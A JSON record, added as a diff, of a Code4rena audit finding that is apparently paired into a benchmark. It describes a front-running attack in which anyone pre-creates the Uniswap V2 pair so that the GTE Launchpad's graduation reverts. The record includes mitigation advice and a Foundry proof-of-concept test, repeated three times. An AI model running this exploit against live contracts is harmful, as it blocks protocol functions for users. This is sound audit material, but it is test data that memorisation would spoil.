@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "GTE Perps and Launchpad_gtn2Umg6KsC",
+    "audit_uid": "gtn2Umg6KsC",
+    "requested_submission_uid": "LP5U9xtxxNU",
+    "requested_finding_uid": "WxFog2dKdF8",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/GTE_Perps_and_Launchpad_gtn2Umg6KsC/20260618_145637/findings.json",
+    "source_submission_uid": "LP5U9xtxxNU",
+    "source_finding_uid": "WxFog2dKdF8",
+    "original_report_path": "GTE Perps and Launchpad_gtn2Umg6KsC\\high_valid_LP5U9xtxxNU.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "LP5U9xtxxNU",
+  "finding_uid": "WxFog2dKdF8",
+  "finding_number": "6",
+  "title": "Launchpad Pair Creation Vulnerability",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "mahdifa",
+  "body": "## Finding Description and Impact\n\nThe `Launchpad` contract's `_createPairAndSwapRemaining` function is vulnerable to a front-running attack where a malicious user can create a Uniswap V2 pair for the token and quote asset before the `buy` function triggers graduation. The function uses a `try-catch` block to handle the `UniswapV2: PAIR_EXISTS` error from `uniV2Factory.createPair`. If the pair creation reverts, the catch block executes without updating the `pair` variable, causing it to retain the value returned by `uniV2Factory.pairFor(token, data.quote)`. However, if a malicious user creates the pair first, the address returned by `pairFor` differs from the actual pair created by the malicious user. This mismatch causes subsequent operations in `_createPairAndSwapRemaining` to fail, as they operate on an incorrect pair address, leading to a transaction revert.\n\n**Impact**: \n\nThis vulnerability prevents the `buy` function from completing the graduation process, blocking liquidity locking in `LaunchpadLPVault` and reward distribution. The attack is trivial to execute, as any user can call `createPair` on the `GTELaunchpadV2PairFactory`, making it a critical disruption to the protocol's core functionality.\n\n## Recommended Mitigation Steps\n\n1. Restrict pair creation in `GTELaunchpadV2PairFactory` to only the `Launchpad` contract by adding a check in the `createPair` function:\n   ```solidity\n   function createPair(address tokenA, address tokenB) external returns (address pair) {\n       require(msg.sender == launchpad, \"Only launchpad can create pair\");\n       // Continue with pair creation logic\n   }\n   ```\n2. Alternatively, validate the pair address in `_createPairAndSwapRemaining` by ensuring `pair` matches the expected address from `uniV2Factory.pairFor(token, data.quote)` before proceeding with operations like `pair.launchpadLp()`.",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IUniswapV2Factory} from \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\nimport {console} from \"forge-std/Test.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    function test_submissionValidity() external {\n        // Create malicious user\n        address maliciousUser = makeAddr(\"maliciousUser\");\n\n        // Malicious user creates the pair first\n        address uniV2Factory = address(uniV2Router.factory());\n        vm.prank(maliciousUser);\n        IUniswapV2Factory(uniV2Factory).createPair(token, address(quoteToken));\n\n        // Now try to trigger graduation by buying the bonding supply\n        deal(address(quoteToken), user, type(uint256).max);\n        uint256 amountOutBase = BONDING_SUPPLY + 1;\n        uint256 maxAmountInQuote = launchpad.quoteQuoteForBase(token, amountOutBase, true) + 1;\n\n        vm.expectRevert(); // Expect revert due to mismatched pair address\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: amountOutBase,\n            maxAmountInQuote: maxAmountInQuote\n        }));\n\n        // Assert that bonding is still active (graduation failed)\n        assertTrue(launchpad.launches(token).active, \"Bonding should still be active as graduation failed\");\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Launchpad.sol#L472"
+  ],
+  "source_record": {
+    "project_id": "gtn2Umg6KsC",
+    "submission_index": "263",
+    "api_submission_id": "",
+    "uid": "LP5U9xtxxNU",
+    "number": "263",
+    "title": "Launchpad Pair Creation Vulnerability",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "mahdifa",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Launchpad.sol#L472"
+    ],
+    "body": "## Finding Description and Impact\n\nThe `Launchpad` contract's `_createPairAndSwapRemaining` function is vulnerable to a front-running attack where a malicious user can create a Uniswap V2 pair for the token and quote asset before the `buy` function triggers graduation. The function uses a `try-catch` block to handle the `UniswapV2: PAIR_EXISTS` error from `uniV2Factory.createPair`. If the pair creation reverts, the catch block executes without updating the `pair` variable, causing it to retain the value returned by `uniV2Factory.pairFor(token, data.quote)`. However, if a malicious user creates the pair first, the address returned by `pairFor` differs from the actual pair created by the malicious user. This mismatch causes subsequent operations in `_createPairAndSwapRemaining` to fail, as they operate on an incorrect pair address, leading to a transaction revert.\n\n**Impact**: \n\nThis vulnerability prevents the `buy` function from completing the graduation process, blocking liquidity locking in `LaunchpadLPVault` and reward distribution. The attack is trivial to execute, as any user can call `createPair` on the `GTELaunchpadV2PairFactory`, making it a critical disruption to the protocol's core functionality.\n\n## Recommended Mitigation Steps\n\n1. Restrict pair creation in `GTELaunchpadV2PairFactory` to only the `Launchpad` contract by adding a check in the `createPair` function:\n   ```solidity\n   function createPair(address tokenA, address tokenB) external returns (address pair) {\n       require(msg.sender == launchpad, \"Only launchpad can create pair\");\n       // Continue with pair creation logic\n   }\n   ```\n2. Alternatively, validate the pair address in `_createPairAndSwapRemaining` by ensuring `pair` matches the expected address from `uniV2Factory.pairFor(token, data.quote)` before proceeding with operations like `pair.launchpadLp()`.",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IUniswapV2Factory} from \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\nimport {console} from \"forge-std/Test.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    function test_submissionValidity() external {\n        // Create malicious user\n        address maliciousUser = makeAddr(\"maliciousUser\");\n\n        // Malicious user creates the pair first\n        address uniV2Factory = address(uniV2Router.factory());\n        vm.prank(maliciousUser);\n        IUniswapV2Factory(uniV2Factory).createPair(token, address(quoteToken));\n\n        // Now try to trigger graduation by buying the bonding supply\n        deal(address(quoteToken), user, type(uint256).max);\n        uint256 amountOutBase = BONDING_SUPPLY + 1;\n        uint256 maxAmountInQuote = launchpad.quoteQuoteForBase(token, amountOutBase, true) + 1;\n\n        vm.expectRevert(); // Expect revert due to mismatched pair address\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: amountOutBase,\n            maxAmountInQuote: maxAmountInQuote\n        }));\n\n        // Assert that bonding is still active (graduation failed)\n        assertTrue(launchpad.launches(token).active, \"Bonding should still be active as graduation failed\");\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/gtn2Umg6KsC/submissions/263",
+    "raw": {
+      "auditUid": "gtn2Umg6KsC",
+      "createdAt": "2025-09-09T14:50:56.805Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "3jeYeStmqfe",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:54:22.542Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "WxFog2dKdF8"
+        },
+        {
+          "uid": "HQoNXk6mQ46",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-08T13:54:23.882Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "WxFog2dKdF8"
+        },
+        {
+          "uid": "NWk8oBH32Ea",
+          "userUid": "AqDoVWhQxFh",
+          "userAuditRole": "judge",
+          "createdAt": "2025-09-15T09:02:09.446Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "LP5U9xtxxNU",
+          "findingUid": null
+        },
+        {
+          "uid": "JN7YRiu9DrU",
+          "userUid": "S427KbaYy5Q",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-10-06T17:38:44.429Z",
+          "type": "validity",
+          "value": "fixed",
+          "submissionUid": null,
+          "findingUid": "WxFog2dKdF8"
+        }
+      ],
+      "finding": {
+        "uid": "WxFog2dKdF8",
+        "number": 6,
+        "duplicates": 54
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2025-12-02T14:28:54.449Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Launchpad Pair Creation Vulnerability",
+      "uid": "LP5U9xtxxNU",
+      "updatedAt": "2025-09-09T14:50:56.805Z",
+      "user": {
+        "uid": "2z2rdhHMazd",
+        "handle": "mahdifa"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding Description and Impact\n\nThe `Launchpad` contract's `_createPairAndSwapRemaining` function is vulnerable to a front-running attack where a malicious user can create a Uniswap V2 pair for the token and quote asset before the `buy` function triggers graduation. The function uses a `try-catch` block to handle the `UniswapV2: PAIR_EXISTS` error from `uniV2Factory.createPair`. If the pair creation reverts, the catch block executes without updating the `pair` variable, causing it to retain the value returned by `uniV2Factory.pairFor(token, data.quote)`. However, if a malicious user creates the pair first, the address returned by `pairFor` differs from the actual pair created by the malicious user. This mismatch causes subsequent operations in `_createPairAndSwapRemaining` to fail, as they operate on an incorrect pair address, leading to a transaction revert.\n\n**Impact**: \n\nThis vulnerability prevents the `buy` function from completing the graduation process, blocking liquidity locking in `LaunchpadLPVault` and reward distribution. The attack is trivial to execute, as any user can call `createPair` on the `GTELaunchpadV2PairFactory`, making it a critical disruption to the protocol's core functionality.\n\n## Recommended Mitigation Steps\n\n1. Restrict pair creation in `GTELaunchpadV2PairFactory` to only the `Launchpad` contract by adding a check in the `createPair` function:\n   ```solidity\n   function createPair(address tokenA, address tokenB) external returns (address pair) {\n       require(msg.sender == launchpad, \"Only launchpad can create pair\");\n       // Continue with pair creation logic\n   }\n   ```\n2. Alternatively, validate the pair address in `_createPairAndSwapRemaining` by ensuring `pair` matches the expected address from `uniV2Factory.pairFor(token, data.quote)` before proceeding with operations like `pair.launchpadLp()`.",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {IUniswapV2Factory} from \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport {GTELaunchpadV2Pair} from \"contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\";\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\nimport {console} from \"forge-std/Test.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    function test_submissionValidity() external {\n        // Create malicious user\n        address maliciousUser = makeAddr(\"maliciousUser\");\n\n        // Malicious user creates the pair first\n        address uniV2Factory = address(uniV2Router.factory());\n        vm.prank(maliciousUser);\n        IUniswapV2Factory(uniV2Factory).createPair(token, address(quoteToken));\n\n        // Now try to trigger graduation by buying the bonding supply\n        deal(address(quoteToken), user, type(uint256).max);\n        uint256 amountOutBase = BONDING_SUPPLY + 1;\n        uint256 maxAmountInQuote = launchpad.quoteQuoteForBase(token, amountOutBase, true) + 1;\n\n        vm.expectRevert(); // Expect revert due to mismatched pair address\n        vm.prank(user);\n        launchpad.buy(ILaunchpad.BuyData({\n            account: user,\n            token: token,\n            recipient: user,\n            amountOutBase: amountOutBase,\n            maxAmountInQuote: maxAmountInQuote\n        }));\n\n        // Assert that bonding is still active (graduation failed)\n        assertTrue(launchpad.launches(token).active, \"Bonding should still be active as graduation failed\");\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/launchpad/Launchpad.sol#L472",
+      "number": 263,
+      "aiExplanation": null,
+      "_index": 263
+    }
+  }
+}
